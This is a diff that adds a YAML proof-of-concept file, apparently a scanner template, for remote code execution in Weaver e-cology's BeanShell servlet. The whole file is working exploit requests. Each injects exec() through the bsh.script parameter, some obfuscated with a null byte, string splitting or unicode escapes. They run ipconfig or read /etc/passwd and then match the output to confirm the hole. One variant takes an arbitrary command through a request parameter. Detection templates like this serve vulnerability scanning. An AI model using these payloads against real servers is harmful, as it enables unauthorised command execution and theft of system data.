@@ -1,0 +1,44 @@
+name: poc-yaml-weaver-e-cology-RCE
+groups:
+  win:
+    - method: POST
+      path: /weaver/bsh.servlet.BshServlet
+      body:
+        bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\"command\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=ipconfig
+      expression:
+        response.status == 200 && response.body.bcontains(b"Windows IP")
+    - method: POST
+      path: /weaver/bsh.servlet.BshServlet
+      body:
+        bsh.script=\u0065\u0078\u0065\u0063("ipconfig");&bsh.servlet.output=raw
+      expression:
+        response.status == 200 && response.body.bcontains(b"Windows IP")
+    - method: POST
+      path: /weaver/bsh.servlet.BshServlet
+      body:
+        bsh.script=exec("ipconfig");&bsh.servlet.output=raw
+      expression:
+        response.status == 200 && response.body.bcontains(b"Windows IP")
+  linux:
+    - method: POST
+      path: /weaver/bsh.servlet.BshServlet
+      body:
+        bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\"command\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=cat /etc/passwd
+      expression:
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    - method: POST
+      path: /weaver/bsh.servlet.BshServlet
+      body:
+        bsh.script=\u0065\u0078\u0065\u0063("cat /etc/passwd");&bsh.servlet.output=raw
+      expression:
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    - method: POST
+      path: /weaver/bsh.servlet.BshServlet
+      body:
+        bsh.script=exec("cat /etc/passwd");&bsh.servlet.output=raw
+      expression:
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+detail:
+  author: sakura404x
+  links:
+    - https://www.cnblogs.com/KHZ521/p/14017940.html
